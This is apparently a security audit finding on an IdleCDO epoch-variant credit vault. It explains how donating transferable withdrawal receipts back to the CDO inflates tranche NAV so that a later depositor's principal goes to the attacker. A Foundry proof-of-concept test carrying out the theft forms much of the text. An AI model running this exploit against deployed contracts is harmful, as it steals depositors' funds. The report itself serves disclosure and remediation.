### Title
Unclaimed withdrawal receipts donated to the CDO inflate tranche NAV and can erase later depositors’ shares - ([File: `contracts/IdleCDOCreditVault.sol`](contracts/IdleCDOCreditVault.sol))

### Summary
`IdleCreditVault` withdrawal receipts are ordinary ERC20 strategy tokens minted to the requesting user, while the corresponding principal is burned from the CDO. [1](#0-0)  A KYC-passing lender can request most of a withdrawal, transfer the newly minted receipt back to `IdleCDOEpochVariant`, and cause CDO NAV to increase because `getContractValue()` counts the CDO’s entire strategy-token balance. [2](#0-1)  The donation guard removes only raw `token`, not strategy tokens or withdrawal receipts. [3](#0-2) 

### Finding Description
During the buffer phase, an attacker deposits `P`, retains one tranche share, and requests a withdrawal for `P - 1`. The strategy burns `P - 1` strategy tokens from the CDO and mints the withdrawal receipt to the attacker. [1](#0-0)  Because `IdleCreditVault` is an unrestricted `ERC20Upgradeable`, the attacker can transfer that receipt directly back to the CDO. [4](#0-3) 

The next victim deposit calls `_skimDonatedAssets()` and then `super._deposit()`. [5](#0-4)  The parent updates accounting before minting shares, so the transferred receipt is treated as a gain and increases the saved tranche price. [6](#0-5)  `_mintSharesAtCurrPrice()` then mints `amount / price`, so a sufficiently large donated receipt makes the victim receive zero shares while the deposited principal is added to the attacker-controlled tranche NAV. [7](#0-6) 

The original withdrawal request also remains recorded even though its receipt was moved to the CDO, creating an additional unclaimable or stranded claim. [8](#0-7) 

### Impact Explanation
This breaks fair mint/burn accounting and allows direct theft of a later depositor’s principal. For example, with a 1,000-unit deposit, one retained share, a donated receipt of approximately 999 units, and zero fees, a victim depositing 100 units mints zero tranche tokens. The attacker’s single share is then backed by approximately 1,100 units and can obtain a withdrawal receipt for nearly the entire CDO balance. [9](#0-8)  The stale first withdrawal request can additionally cause funded recovery or withdrawal liquidity to remain permanently stranded because its receipt is no longer held by the requester. [10](#0-9) 

### Likelihood Explanation
The attacker only needs to be an allowed lender able to call `depositAA()` and `requestWithdraw()` during the buffer phase. No privileged role, oracle manipulation, borrower misconduct, or loss event is required. The exploit requires a subsequent depositor to interact before the stale request is resolved, which is a realistic buffer-phase sequence; deposits and withdrawal requests intentionally remain enabled between epochs. [11](#0-10) 

### Recommendation
Do not count arbitrary CDO-held strategy tokens as active NAV. Track the expected active strategy-token balance explicitly and use that accounted balance, or at minimum cap NAV contributions at the internally accounted amount. Prevent transfers of `IdleCreditVault` receipts back to `idleCDO` in a token transfer hook while still allowing mints from `address(0)`. Add an invariant or recovery path for `strategyToken.balanceOf(idleCDO) != accountedActiveBacking + expectedFeeBacking`, and cover withdrawal-receipt transfers in deposit, request, stop-epoch, and default-recovery tests.

### Proof of Concept
The following test is designed to be appended to `test/foundry/IdleCreditVault.t.sol` and uses the existing fork fixture and helpers:

```solidity
function testWithdrawReceiptDonationInflatesTrancheAndStealsDeposit() external {
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, 0);

    uint256 attackerPrincipal = 1_000 * ONE_SCALE;
    uint256 retainedShares = 1;
    uint256 victimDeposit = 100 * ONE_SCALE;

    address attacker = makeAddr("receiptDonationAttacker");
    address victim = makeAddr("receiptDonationVictim");

    deal(defaultUnderlying, attacker, attackerPrincipal);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), attackerPrincipal);
    idleCDO.depositAA(attackerPrincipal);
    vm.stopPrank();

    uint256 attackerShares = IERC20(address(AAtranche)).balanceOf(attacker);
    assertGt(attackerShares, retainedShares);

    // The attacker leaves one tranche share and receives a transferable
    // IdleCreditVault receipt for the rest of the position.
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(attackerShares - retainedShares, address(AAtranche));

    uint256 donatedReceipt =
        IERC20(address(strategy)).balanceOf(attacker);
    assertGt(donatedReceipt, victimDeposit);

    // Donating the strategy-token receipt inflates CDO NAV because only raw
    // underlying donations are skimmed.
    vm.prank(attacker);
    IERC20(address(strategy)).transfer(address(cdoEpoch), donatedReceipt);

    deal(defaultUnderlying, victim, victimDeposit);
    vm.startPrank(victim);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), victimDeposit);
    uint256 victimMinted = idleCDO.depositAA(victimDeposit);
    vm.stopPrank();

    // The inflated price gives the victim no shares despite depositing principal.
    assertEq(victimMinted, 0);
    assertEq(
        IERC20(address(AAtranche)).balanceOf(attacker),
        retainedShares
    );

    // The attacker's one retained share now claims both its remaining principal,
    // the donated receipt value, and the victim's deposit.
    uint256 attackerValue =
        retainedShares *
        cdoEpoch.virtualPrice(address(AAtranche)) /
        ONE_TRANCHE_TOKEN;

    assertGt(attackerValue, attackerPrincipal);

    // Convert that inflated NAV into a funded withdrawal receipt.
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche));

    uint256 attackerClaim =
        IERC20(address(strategy)).balanceOf(attacker);
    assertGt(attackerClaim, attackerPrincipal);
}
```

The assertion `victimMinted == 0` demonstrates the broken fair-mint invariant, while `attackerClaim > attackerPrincipal` quantifies the attacker-controlled claim containing the victim’s 100-unit deposit.
